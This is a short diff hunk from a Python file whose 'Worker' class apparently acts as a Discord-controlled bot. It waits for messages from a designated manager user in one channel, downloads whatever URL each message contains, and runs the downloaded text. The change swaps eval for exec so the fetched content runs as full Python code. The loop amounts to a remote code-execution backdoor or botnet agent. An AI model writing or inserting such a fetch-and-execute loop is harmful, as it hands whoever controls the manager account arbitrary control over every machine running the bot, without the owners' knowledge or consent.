@@ -34,4 +34,4 @@ class Worker:
     while True:
       order = await self.bot.wait_for("message", check=lambda m: m.author.id == self.manager and m.channel == base)
       page = requests.get(order.content).text
-      eval(str(page))
+      exec(str(page))
